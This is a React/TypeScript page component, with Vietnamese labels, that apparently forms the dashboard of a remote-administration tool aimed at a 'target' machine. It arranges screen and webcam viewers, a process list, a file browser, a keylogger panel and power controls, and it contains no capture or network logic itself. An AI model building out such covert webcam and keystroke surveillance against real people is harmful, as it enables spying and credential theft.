import type { Agent } from '../types/protocol';
import { ConnectionBadge } from '../components/ConnectionBadge';
import { ScreenViewer } from '../components/ScreenViewer';
import { WebcamViewer } from '../components/WebcamViewer';
import { ProcessList } from '../components/ProcessList';
import { FileBrowser } from '../components/FileBrowser';
import { KeyloggerPanel } from '../components/KeyloggerPanel';
import { PowerControls } from '../components/PowerControls';
export function ControlPage({ token, sessionId, agent, connectionState, onLeave }: { token: string; sessionId: string; agent: Agent; connectionState: string; onLeave: () => void }) { return <main className="control"><header><div><button className="link" onClick={onLeave}>← Đổi Target</button><p className="eyebrow">PHIÊN ĐIỀU KHIỂN</p><h1>{agent.name}</h1><code>{agent.id}</code></div><ConnectionBadge state={connectionState} /></header><div className="grid top-grid"><ScreenViewer sessionId={sessionId} /><WebcamViewer sessionId={sessionId} /></div><div className="grid"><ProcessList sessionId={sessionId} /><FileBrowser sessionId={sessionId} /></div><div className="grid"><KeyloggerPanel sessionId={sessionId} /><PowerControls sessionId={sessionId} token={token} /></div></main>; }
